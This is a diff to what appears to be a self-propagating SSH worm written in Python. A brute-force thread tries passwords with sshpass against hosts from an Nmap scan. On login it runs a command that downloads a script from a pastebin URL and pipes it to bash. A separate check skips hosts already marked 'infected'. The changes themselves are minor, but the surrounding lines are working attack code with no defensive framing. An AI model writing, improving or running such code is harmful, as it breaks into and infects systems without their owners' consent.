@@ -42,7 +42,7 @@ class BruteForceTask(Thread):
     def run(self):
         try:
             cmd = "setsid sshpass -p \"{0}\" ssh {1} \"wget -q -O - https://pastebin.com/raw/dFrUfqat | tr -d '\\r' | bash\"".format(self.password, self.host)
-            subprocess.call(cmd, shell=True)
+            subprocess.check_output(cmd, shell=True)
             print("cmd finished: " + cmd)
             passwordFoundCallback(self.password, self.sharedO)
         except:
@@ -74,8 +74,7 @@ for ip in listedNmapString:
                                                              #need an instance of sharedThings per attacked Host
         #TODO: ssh root login is disabled on PIONE; Couldnt test PITWO since i cant find it
         if not errorOccured and dataDecoded == 'OK':
-                print('ErreurOccured = false, dataDecoded = OK')
-                print('Machine already infected. Passing to the next one...')
+                print(ip, 'already infected. Passing to the next one...')
                 continue
         
         
